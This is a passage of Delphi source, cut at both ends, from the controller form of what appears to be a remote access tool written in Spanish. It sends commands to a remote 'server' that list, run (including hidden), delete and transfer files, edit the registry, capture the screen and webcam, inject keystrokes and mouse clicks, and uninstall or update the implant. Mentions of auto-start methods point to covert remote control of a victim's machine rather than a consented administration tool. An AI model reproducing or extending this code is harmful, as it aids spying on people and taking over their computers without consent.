    //Manda 'LISTARARCHIVOS|C:\'
    EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;

  if ListViewArchivos.Selected = nil then
    MessageDlg(_('Dale doble click a una carpeta o a un archivo!'), mtWarning, [mbOK], 0)
  else
  begin
    StatusBar.Panels[1].Text := _('Listando archivos...');
    if ListViewArchivos.Selected.Caption = '<..>' then
    begin
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
      Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clickiò una carpeta
    begin
      ListViewArchivos.Selected.ImageIndex := 4;  //Icono de carpeta abierta
      EditPathArchivos.Text :=
        EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
      Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else  //doble-clickiò un archivo
    begin
      //Tal vez escribir código para ejecutar...
    end;
  end;
end;

//Función que se ejecuta justo antes de mostrarse el popupmenu para habilitar o deshabilitar submenus
procedure TFormControl.ListViewArchivosContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
var
  ext: string;
  i: integer;
begin
  for i:= 0 to PopupFileManager.items.count-1 do
    PopupFileManager.items[i].visible := true;//todos visibles
  PopupFileManager.items[15].visible := false; //Abrir directorio del archivo

  if ListViewArchivos.Selected <> nil then //Algún item seleccionado
  begin
    for i:= 0 to PopupFileManager.items.count-1 do //primero habilitamos todos
      PopupFileManager.items[i].enabled := true;
    if (ListViewArchivos.Selected.ImageIndex = 3) then  //Es una carpeta
    begin
      PopupFileManager.Items[0].Enabled := True;  //Descargar!
      PopupFileManager.Items[1].Enabled := False;  //No Encolar Descarga
      PopupFileManager.Items[4].Enabled := False;  //No ejecutar
      PopupFileManager.Items[10].Enabled := False;  //No Previsualizar jpg
    end
    else  //Viceversa
    begin
      PopupFileManager.Items[0].Enabled := True;
      PopupFileManager.Items[1].Enabled := True;
      PopupFileManager.Items[4].Enabled := True;
      PopupFileManager.Items[10].Enabled := True;
    end;
    PopupFileManager.Items[5].Enabled := True;  //Eliminar
    PopupFileManager.Items[7].Enabled := True;  //Cambiar nombre
    PopupFileManager.Items[8].Enabled := True;  //Nueva carpeta
    ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
    if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') or (lowercase(ext) = '.bmp') then
    begin
      PopupFileManager.Items[10].Enabled := True; //Previsualizar jpg avanzado
    end;

    if listviewarchivos.Selected.subitems.Count >0 then //no disponible
    begin
      PopupFileManager.Items[6].Enabled := True; //Atributos
      if((pos('Oculto',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
        Oculto2.Checked := true
      else
        Oculto2.Checked := false;

      if((pos('Sistema',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
        Sistema1.Checked := true
      else
        Sistema1.Checked := false;

      if((pos('Lectura',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
        Slolectura1.Checked := true
      else
        Slolectura1.Checked := false;
    end;
    
  end
  else  //Si no se ha seleccionado ningún item
  begin
    PopupFileManager.Items[0].Enabled := False; //Deshabilitar Descargar
    PopupFileManager.Items[1].Enabled := False; //Deshabilitar Encolar Descarga
    PopupFileManager.Items[3].Enabled := False; //Deshabilitar Ejecutar
    PopupFileManager.Items[4].Enabled := False; //Deshabilitar Eliminar
    PopupFileManager.Items[5].Enabled := False; //Deshabilitar Cambiar nombre
    PopupFileManager.Items[6].Enabled := False; //Deshabilitar Cambiar atributos
    PopupFileManager.Items[10].Enabled := False; //Previsualizar jpg avanzado
    PopupFileManager.Items[11].Enabled := False; //Portapapeles
    PopupFileManager.Items[7].Enabled := False; //Deshabilitar
    if EditPathArchivos.Text = '' then
      //Si no está en ningún Path deshabilitar crear carpeta
      PopupFileManager.Items[8].Enabled := False;
  end;

end;

procedure TFormControl.Normal1Click(Sender: TObject);
var
  FilePath : string;
begin
  if Servidor.Connection.Connected then
  begin
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      mslistviewitem := ListViewArchivos.Selected
    else
      mslistviewitem := ListViewBuscar.Selected;
      
    while Assigned(mslistviewitem) do
    begin
    
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := EditPathArchivos.Text +mslistviewitem.Caption
      else
        FilePath := mslistviewitem.Caption;

      Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Oculto1Click(Sender: TObject);
var
  FilePath : string;
begin
  if Servidor.Connection.Connected then
  begin
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      mslistviewitem := ListViewArchivos.Selected
    else
      mslistviewitem := ListViewBuscar.Selected;

    while Assigned(mslistviewitem) do
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := EditPathArchivos.Text + mslistviewitem.Caption
      else
        FilePath := mslistviewitem.Caption;
      Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);

      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);

    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.EliminarClick(Sender: TObject);
var
  FilePath : string;
begin
  if Servidor.Connection.Connected then
  begin
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      mslistviewitem := ListViewArchivos.Selected
    else
      mslistviewitem := ListViewBuscar.Selected;

    while Assigned(mslistviewitem) do
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := EditPathArchivos.Text + mslistviewitem.Caption
      else
        FilePath := mslistviewitem.Caption;
      if mslistviewitem.ImageIndex = 3 then
      begin
        if MessageDlg(_('¿Está seguro que quiere borrar la carpeta ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
        Servidor.Connection.Writeln('DELFOLDER|' + FilePath);
      end
      else
      if MessageDlg(_('¿Está seguro que quiere borrar el archivo ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
      Servidor.Connection.Writeln('DELFILE|' + FilePath);
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      btnactualizararchivos.Click;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Cambiarnombre1Click(Sender: TObject);
begin
  //Se pone el cursor de edición sobre el caption del item
  ListViewArchivos.Selected.EditCaption;
end;


procedure TFormControl.ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;  Item: TListItem; SubItem: integer; State: TCustomDrawState; var DefaultDraw: boolean);
var
  Descarga: TDescargaHandler;
begin
  //exit;
  if (item.data <> nil) then
  begin
  Descarga := TDescargaHandler(Item.Data);
  if Descarga.Finalizado then
  begin
    Sender.Canvas.Font.Color := clGreen;
    Sender.Canvas.Font.Style := [fsbold];
  end
  else if not Descarga.cancelado then
  begin
    Sender.Canvas.Font.Color := clBlack;
    Sender.Canvas.Font.Style := [];
  end
  else
  begin
    Sender.Canvas.Font.Color := clRed;
    Sender.Canvas.Font.Style := [fsbold];
  end;
  end;
end;
procedure TFormControl.ListViewArchivosEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin
  if Servidor.Connection.Connected then
  begin
    if S = '' then
    begin
      S := Item.Caption;
      Exit;
    end;
    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or
      (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or
      (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      MessageDlg(
        _('Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres:')+' */\?"<>|',
        mtError, [mbOK], 0);
      S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
    end
    else
      Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
        ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Crearnuevacarpeta1Click(Sender: TObject);
var
  DirName: string;
begin
  if Servidor.Connection.Connected then
  begin
    DirName := InputBox(_('Escriba el nombre para la nueva carpeta.'),
      _('Crear nueva carpeta'), _('Nueva carpeta'));
    if DirName <> '' then
    begin
      if DirName[Length(DirName)] <> '\' then
        DirName := DirName + '\';
      Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
    end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
begin
  if not BtnActualizarArchivos.Enabled then exit;
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;

  if Length(EditPathArchivos.Text) < 3 then
  begin
    MessageDlg(_('No escribiste un directorio válido.'), mtWarning, [mbOK], 0);
    exit;
  end;
  BtnActualizarArchivos.Enabled := false;
  if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
    EditPathArchivos.Text := EditPathArchivos.Text + '\';
  Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
end;

//Obtiene la ruta completa del arbol padre\hijo\nieto\ xD
function TFormControl.ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
begin
  repeat
    Result := Nodo.Text + '\' + Result;
    Nodo   := Nodo.Parent;
  until not Assigned(Nodo);
end;

procedure TFormControl.TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;

  if TreeViewRegedit.Selected <> nil then
  begin
    EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
    ListViewRegistro.enabled := false;
    BtnVerRegisto.enabled := false;
  end;
end;

procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;
  TreeViewRegedit.enabled := false;
  Servidor.Connection.Writeln('LISTARCLAVES|' + EditPathRegistro.Text);
end;

//Lo hacemos en una función a parte para no saturar de código la función OnRead
procedure TFormControl.AniadirClavesARegistro(Claves: string);
var
  Nodo:  TTreeNode;
  Clave: string;
  Total, Listadas : integer;
  tmp: string;
begin
  //Borramos los hijos que tenga, para no repetirnos en caso de pulsar dos veces
  //sobre una misma clave
  TreeViewRegedit.Items.beginupdate;
  TreeViewRegedit.Selected.DeleteChildren;
  Claves := StringReplace(Claves,'|salto|', #10, [rfReplaceAll]);
  Claves := StringReplace(Claves,'|salto2|', #13, [rfReplaceAll]);

  tmp := claves;
  Total := 0;
  while Pos('|', tmp) > 0 do  //Primero las contamos para poder mostrar en el panel cuantas hay
  begin
    Total := Total+1;
    Delete(tmp, 1, Pos('|', tmp));
  end;
  listadas := 0;
  while Pos('|', Claves) > 0 do
  begin
    Listadas := Listadas+1;
    Statusbar.panels[1].text := _('Listadas ')+inttostr(Listadas)+_(' claves de ')+inttostr(Total);
    Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
    Nodo  := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
    //Sin seleccionar mostrar el icono de carpeta cerrada
    Nodo.ImageIndex := 1;
    //Seleccionado mostrar el icono de carpeta abierta
    Nodo.SelectedIndex := 0;
    Delete(Claves, 1, Pos('|', Claves));
  end;
  TreeViewRegedit.Selected.Expand(False);
  TreeViewRegedit.Items.endupdate;
  Statusbar.panels[1].text := _('Claves listadas');
  TreeViewRegedit.enabled := true;
end;

procedure TFormControl.AniadirValoresARegistro(Valores: string);
var
  Item: TListItem;
  Tipo: string;
begin
  ListViewRegistro.Clear;
  ListViewRegistro.items.beginupdate;
  Valores := StringReplace(Valores,'|salto|', #10, [rfReplaceAll]);
  Valores := StringReplace(Valores,'|salto2|', #13, [rfReplaceAll]);

  while Pos('|', Valores) > 0 do
  begin
    Item := ListViewRegistro.Items.Add;
    //Nombre
    Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
    Delete(Valores, 1, Pos('|', Valores));
    //Tipo
    Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);

    if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
      Item.ImageIndex := 16
    else
      Item.ImageIndex := 15;
    Item.SubItems.Add(Tipo);
    Delete(Valores, 1, Pos('|', Valores));
    //Datos
    Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
    Delete(Valores, 1, Pos('|', Valores));
  end;
  ListViewRegistro.items.endupdate;
  ListViewRegistro.enabled := true;
  ListViewRegistro.Width := ListViewRegistro.Width-1;//Para eliminar la scrollvar horizontal
  ListViewRegistro.Width := ListViewRegistro.Width+1;
end;

procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
begin
  if EditPathRegistro.text = '' then exit;
  if not BtnVerRegisto.enabled then exit;
  BtnVerRegisto.enabled := false;
  if Servidor.Connection.Connected then
  begin
    ListViewRegistro.enabled := false;
    BtnVerRegisto.enabled := false;
    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.N1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType = TListView then
    begin
      if ListViewRegistro.Selected <> nil then
        //Pone el cursor para editar en el item
        ListViewRegistro.Selected.EditCaption;
    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Una vez editado el valor le avisamos al server
procedure TFormControl.ListViewRegistroEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;

  Servidor.Connection.Writeln('NEWNOMBREVALOR|' + EditPathRegistro.Text +
    '|' + Item.Caption + '|' + S);
end;

procedure TFormControl.Eliminar1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType = TListView then
    begin
      if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
        ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
          ListViewRegistro.Selected.Caption);
    end
    else
    if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
      TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
      Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valoralfanumrico1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valorbinerio1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.valorDWORD1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valordecadenamltiple1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text,
      'REG_MULTI_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  //Para que al hacer click derecho sobre un item este pase a estar seleccionado
  if TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y) <> nil then
  begin
    TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
    //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    //Activamos el resto
    PopupRegistro.Items[3].Enabled := True;
  end
  else //No se ha seleccionado item, así que solo mostramos el menu de nuevo
  begin
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.ListViewRegistroContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  //Se ha seleccionado un item
  if ListViewRegistro.Selected <> nil then
  begin
    //Habilitamos las opciones para trabajar con claves
    PopupRegistro.Items[1].Enabled := True;
    PopupRegistro.Items[2].Enabled := True;
    PopupRegistro.Items[3].Enabled := True;
  end
  else
  begin
    //No se ha seleccionado un item, solo mostramos el menu Nuevo
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.Clave1Click(Sender: TObject);
var
  NewClave: string;
begin
  if Servidor.Connection.Connected then
  begin
    NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
      _('Crear nueva clave'), _('NuevaClave'));
    if NewClave <> '' then
      Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarMensajeClick(Sender: TObject);
var
  Tipo: string;
begin
  if Servidor.Connection.Connected then
  begin
    if RdGrpBotonesMensaje.ItemIndex <> -1 then
    begin
      if RdBtnError.Checked then
        Tipo := 'WARN'
      else if RdBtnPregunta.Checked then
        Tipo := 'QUES'
      else if RdBtnExclamacion.Checked then
        Tipo := 'EXCL'
      else if RdBtnInfo.Checked then
        Tipo := 'INFO'
      else if RdBtnVacio.Checked then
        Tipo := 'VACI';
      Servidor.Connection.Writeln('MSJN' + MemoMensaje.Text + '|' +
        EditTituloMensaje.Text + '|' + Tipo + '|' +
        PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
    end
    else
      MessageDlg(_('Selecciona algún tipo de botón'), mtWarning, [mbOK], 0);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadChange(Sender: TObject);
begin
  LabelPosicionCompresJpg.Caption := IntToStr(TrackBarCalidad.Position) + '%';
end;

procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  imgCaptura.Picture := nil; //Refrescamos
  PedirJPG(0,'');
end;


procedure TFormControl.Enviarteclas1Click(Sender: TObject);
//Enviar teclas a una ventana....
var
  NewSendKeys: TFormSendKeys;
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewVentanas.Selected = nil then
    begin
      MessageDlg(_('Selecciona alguna ventana para enviarle teclas.'),
        mtWarning, [mbOK], 0);
    end
    else
    begin
      NewSendKeys := TFormSendKeys.Create(self, Servidor,
        ListViewVentanas.Selected.SubItems[0], ListViewVentanas.Selected.Caption);
      NewSendKeys.Show;
    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadWebcamChange(Sender: TObject);
begin
  LabelPosicionCompresJpgWebcam.Caption :=
    IntToStr(TrackBarCalidadWebcam.Position) + ' %';
end;

procedure TFormControl.BtnObtenerWebcamsClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    Exit;
  end;

  Servidor.Connection.Writeln('LISTARWEBCAMS');
end;

procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;

  imgWebcam.Picture := nil; //Refrescamos
  PedirJPG(1,'');
end;

procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: integer);
var
  AltoCap, AnchoCap: integer;
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

  if CheckBoxMouseClicks.Checked then
  begin

    if(anchurapantalla = 0) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
    begin
      MessageDlg(_('Pide una captura primero!'), mtWarning, [mbOK], 0);
      exit;
    end;
    
    AnchoCap := AnchuraPantalla;
    AltoCap := AlturaPantalla;
    X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
    Y := (Y * AltoCap) div (imgCaptura.Height);
    if button = mbLeft then
      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
        IntToStr(y) + '|' + 'CLICKIZQ' + '|')
    else if button = mbRight then
      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
        IntToStr(y) + '|' + 'CLICKDER' + '|');
  end;
end;

procedure TFormControl.BtnActualizarServidorInfoClick(Sender: TObject);
begin
  if not BtnActualizarServidorInfo.enabled then exit;
  BtnActualizarServidorInfo.enabled := false;
  if Servidor.connection.Connected then
    Servidor.connection.writeln('SERVIDOR|INFO|')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarComandoServidorClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

  if ComboBoxGestionDeServidor.Text = _('Cerrar') then
  begin
    if MessageBox(Handle,
      Pchar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
  end;
  if ComboBoxGestionDeServidor.Text = _('Desinstalar') then
  begin
    if MessageBox(Handle,
      Pchar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
  end;
  if ComboBoxGestionDeServidor.Text = _('Actualizar') then
  begin
    if MessageBox(Handle,
      Pchar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
      pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
  end;
end;

procedure TFormControl.BtnVerGrandeCapClick(Sender: TObject);
begin
  if FormVisorCaptura = nil then
    FormVisorCaptura := TScreenMax.Create(self, ImgCaptura.Picture, Servidor,Tobject(self));
  (FormVisorCaptura as TScreenMax).show;
end;


procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    self.TimerCaptureScreen.Enabled := False;
    exit;
  end;
  pedirJPG(0,'');
end;


//El popup de Descargar fichero añade el archivo al ListView de descargas, lo encola
procedure TFormControl.Descargarfichero1Click(Sender: TObject);
var
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
if PageControlArchivos.ActivePage = TabSheetVerArchivos then
  mslistviewitem := ListViewArchivos.Selected
else
  mslistviewitem := ListViewBuscar.Selected;

while Assigned(mslistviewitem) do
begin
  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption)
  else
    FilePath := Trim(mslistviewitem.Caption);

  if (mslistviewitem.ImageIndex = 3) then
  begin
    PageControlArchivos.activepage := TabSheetTransferencias;
    Servidor.Connection.Writeln('GETFOLDER|' + FilePath+'\');
  end
  else
      agregardescarga(FilePath);
  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
  else
    mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
end;





end;

//El popup de Subir fichero añade el archivo al ListView de descargas, lo encola
procedure TFormControl.Subirfichero1Click(Sender: TObject);
var
  i: integer;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

  if EditPathArchivos.Text = '' then
  begin
    MessageDlg(_('Entra al directorio primero!'), mtWarning, [mbOK], 0);
    exit;
  end;

  if OpenDialogUpload.Execute then
  begin
    //nos aseguramos de que el archivo no este en la lista de
    //descargas (sin importar si esta transfiriendo o si ya finalizo)
    FilePath := OpenDialogUpload.FileName;
    FilePath := EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName);
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = FilePath then
      begin
        MessageDlg(('El achivo ya se encuentra en la lista de descargas'),
          mtWarning, [mbOK], 0);
        Exit;
      end;
    end;
    Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
      '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
      '|' + MD5(OpenDialogUpload.FileName) +
      '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
  end;
end;

procedure TFormControl.OnReadFile(AThread: TIdPeerThread);
var
  Buffer: string;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
  Size: int64;
  i: integer;
  MS:TMemoryStream;
  JPG: TJPEGImage;
  tmpstr : string;
begin
  Buffer := Trim(Athread.Connection.ReadLn);
  if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size     := StrToInt(Trim(Buffer));
    CrearDirectoriosUsuario();
    Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
    ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'+
    ExtractFileName(FilePath), ListViewDescargas, True);
    Descarga.callback := Self.TransferFinishedNotification;
    Descarga.transferFile;
  end
  else if Copy(PChar(Buffer), 1, 14) = 'RESUMETRANSFER' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Buffer);
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = FilePath then
      begin
        Descarga.AThread  := Athread; //El socket anterior ya esta desconectado
        Descarga.SizeFile := Size;
        Descarga.ResumeTransfer;
        Exit;
      end;
    end;
  end
  else if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    tmpstr := Copy(Buffer, 1, Pos('|', Buffer) - 1); //HASH
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Trim(Buffer);

    if MD5(FilePath) <> Tmpstr then
    begin
      MessageDlg(_('Intento de intrusión a archivo bloqueado: ')+FilePath,mtWarning, [mbOK], 0);
    end
    else
    begin
